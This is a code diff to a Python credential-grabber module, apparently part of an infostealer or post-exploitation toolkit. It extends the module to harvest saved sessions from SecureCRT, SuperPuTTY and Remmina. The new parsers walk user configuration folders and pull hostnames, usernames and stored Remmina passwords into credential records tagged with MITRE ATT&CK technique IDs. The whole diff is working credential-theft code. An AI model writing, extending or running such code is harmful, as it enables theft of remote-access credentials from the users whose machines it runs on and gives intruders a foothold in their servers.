@@ -26,7 +26,7 @@ from .utils import safe_read_text
 
 class RemoteAccessGrabber(GrabberModule):
     name = "remote_access"
-    description = "Extract credentials from FileZilla, WinSCP, mRemoteNG, MobaXterm"
+    description = "Extract credentials from FileZilla, WinSCP, mRemoteNG, MobaXterm, SecureCRT, SuperPuTTY, Remmina"
     min_privilege = PrivilegeLevel.USER
     supported_platforms = ("Windows", "Darwin", "Linux")
     default_enabled = True
@@ -37,6 +37,12 @@ class RemoteAccessGrabber(GrabberModule):
         ("{appdata}/mRemoteNG/confCons.xml", "_parse_mremoteng"),
         ("{appdata}/WinSCP.ini", "_parse_winscp"),
         ("{appdata}/MobaXterm/MobaXterm.ini", "_parse_mobaxterm"),
+        # SecureCRT sessions
+        ("{appdata}/VanDyke/Config/Sessions", "_parse_securecrt_dir"),
+        # SuperPuTTY
+        ("{appdata}/SuperPuTTY/Sessions.xml", "_parse_superputty"),
+        # Remmina (Linux)
+        ("{home}/.local/share/remmina", "_parse_remmina_dir"),
         # Unix locations
         ("{home}/.config/filezilla/recentservers.xml", "_parse_filezilla"),
         ("{home}/.config/filezilla/sitemanager.xml", "_parse_filezilla"),
@@ -45,7 +51,7 @@ class RemoteAccessGrabber(GrabberModule):
     def preflight_check(self, context: GrabberContext) -> bool:
         for template, _ in self._TARGETS:
             path = self._expand(template, context)
-            if path and os.path.isfile(path):
+            if path and (os.path.isfile(path) or os.path.isdir(path)):
                 return True
         return False
 
@@ -54,11 +60,19 @@ class RemoteAccessGrabber(GrabberModule):
 
         for template, parser_name in self._TARGETS:
             path = self._expand(template, context)
-            if not path or not os.path.isfile(path):
+            if not path:
+                continue
+            if not os.path.isfile(path) and not os.path.isdir(path):
                 continue
 
-            content = safe_read_text(path)
-            if not content:
+            # Directory-based parsers (SecureCRT, Remmina)
+            if os.path.isdir(path) and parser_name.endswith("_dir"):
+                content = ""
+            elif os.path.isfile(path):
+                content = safe_read_text(path)
+                if not content:
+                    continue
+            else:
                 continue
 
             try:
@@ -313,4 +327,128 @@ class RemoteAccessGrabber(GrabberModule):
                     mitre_technique="T1555",
                 ))
 
+        return creds
+
+    def _parse_securecrt_dir(self, path: str, content: str) -> list[ExtractedCredential]:
+        """Parse SecureCRT session INI files from the Sessions directory."""
+        creds = []
+        if not os.path.isdir(path):
+            return creds
+
+        try:
+            for root, dirs, files in os.walk(path):
+                for fname in files:
+                    if not fname.endswith(".ini"):
+                        continue
+                    fpath = os.path.join(root, fname)
+                    ini_content = safe_read_text(fpath)
+                    if not ini_content:
+                        continue
+
+                    hostname = ""
+                    username = ""
+                    port = ""
+                    for line in ini_content.splitlines():
+                        line = line.strip()
+                        if "=" in line:
+                            key, _, value = line.partition("=")
+                            key_lower = key.strip().strip('"').lower()
+                            value = value.strip().strip('"')
+                            if "hostname" in key_lower:
+                                hostname = value
+                            elif "username" in key_lower:
+                                username = value
+                            elif "port" in key_lower:
+                                port = value
+
+                    if hostname and username:
+                        url = f"{hostname}:{port}" if port else hostname
+                        creds.append(ExtractedCredential(
+                            source_module=self.name,
+                            credential_type="password",
+                            target_application="SecureCRT",
+                            url=url,
+                            username=username,
+                            notes=f"session={fname}",
+                            mitre_technique="T1552.001",
+                            source_file=fpath,
+                        ))
+        except (PermissionError, OSError):
+            pass
+        return creds
+
+    def _parse_superputty(self, path: str, content: str) -> list[ExtractedCredential]:
+        """Parse SuperPuTTY Sessions.xml for saved sessions."""
+        creds = []
+        try:
+            root = ElementTree.fromstring(content)
+            for session in root.iter("SessionData"):
+                host = session.attrib.get("Host", "")
+                port = session.attrib.get("Port", "22")
+                username = session.attrib.get("Username", "")
+                name = session.attrib.get("SessionName", "")
+
+                if host and username:
+                    creds.append(ExtractedCredential(
+                        source_module=self.name,
+                        credential_type="password",
+                        target_application="SuperPuTTY",
+                        url=f"{host}:{port}",
+                        username=username,
+                        notes=f"session={name}",
+                        mitre_technique="T1552.001",
+                        source_file=path,
+                    ))
+        except ElementTree.ParseError:
+            pass
+        return creds
+
+    def _parse_remmina_dir(self, path: str, content: str) -> list[ExtractedCredential]:
+        """Parse Remmina .remmina connection files (Linux)."""
+        creds = []
+        if not os.path.isdir(path):
+            return creds
+
+        try:
+            for fname in os.listdir(path):
+                if not fname.endswith(".remmina"):
+                    continue
+                fpath = os.path.join(path, fname)
+                file_content = safe_read_text(fpath)
+                if not file_content:
+                    continue
+
+                server = ""
+                username = ""
+                password = ""
+                protocol = ""
+                for line in file_content.splitlines():
+                    line = line.strip()
+                    if "=" in line:
+                        key, _, value = line.partition("=")
+                        key = key.strip().lower()
+                        value = value.strip()
+                        if key == "server":
+                            server = value
+                        elif key == "username":
+                            username = value
+                        elif key == "password":
+                            password = value
+                        elif key == "protocol":
+                            protocol = value
+
+                if server and (username or password):
+                    creds.append(ExtractedCredential(
+                        source_module=self.name,
+                        credential_type="password",
+                        target_application=f"Remmina ({protocol})" if protocol else "Remmina",
+                        url=server,
+                        username=username,
+                        decrypted_value=password,
+                        notes=f"file={fname}",
+                        mitre_technique="T1552.001",
+                        source_file=fpath,
+                    ))
+        except (PermissionError, OSError):
+            pass
         return creds
